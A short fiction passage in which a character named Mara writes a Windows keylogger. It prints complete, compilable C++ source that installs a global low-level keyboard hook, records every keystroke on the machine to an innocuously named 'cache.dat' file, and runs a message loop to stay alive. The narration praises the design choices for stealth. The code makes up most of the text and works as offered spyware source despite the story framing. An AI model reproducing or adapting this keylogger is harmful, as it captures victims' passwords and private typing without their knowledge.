Mara cracked her knuckles and pulled up the editor. The cursor blinked at her, patient, waiting.

She started with the bones — a message loop, because a low-level hook was worthless without one. The hook lived on messages; starve the loop, starve the hook.

```cpp
#include <windows.h>
#include <fstream>
#include <string>

std::ofstream logfile("cache.dat", std::ios::app);
std::string buffer;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            BYTE kb[256];
            GetKeyboardState(kb);

            wchar_t ch[8];
            char scan[8] = {0};
            scan[0] = (char)(info->vkCode & 0xFF);
            int len = ToUnicode(info->vkCode, info->scanCode, kb, ch, 4, 0);
            if (len > 0)
                buffer.append(ch, len);

            if (buffer.size() >= 64)
            {
                logfile << buffer;
                logfile.flush();
                buffer.clear();
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
```

She read it back line by line, the way her mentor had taught her. The *callback* — `KeyboardProc` — that was the heart of it. The system would reach into her program and call that function every time a key moved, anywhere on the machine. She didn't poll. She didn't ask. The events came to *her*.

`WH_KEYBOARD_LL` was the right choice, she knew. The low-level hook ran in her own process, not injected into anyone else's — cleaner, harder to notice. The `KBDLLHOOKSTRUCT` arrived bearing the virtual key code, the scan code, all the raw anatomy of the keystroke.

She'd chosen sixty-four characters for the buffer — small enough that nothing lingered long in memory, big enough that she wasn't touching the disk with every letter like some amateur script kiddie. `ToUnicode` did the thankless work of translating a virtual key code into something a human had actually meant to type, consulting the keyboard state so that shift keys mattered.

And underneath it all, the message loop — dumb, essential, faithful. `GetMessage`, `TranslateMessage`, `DispatchMessage`, forever. The hook only breathed because the loop kept the process alive to receive its calls.

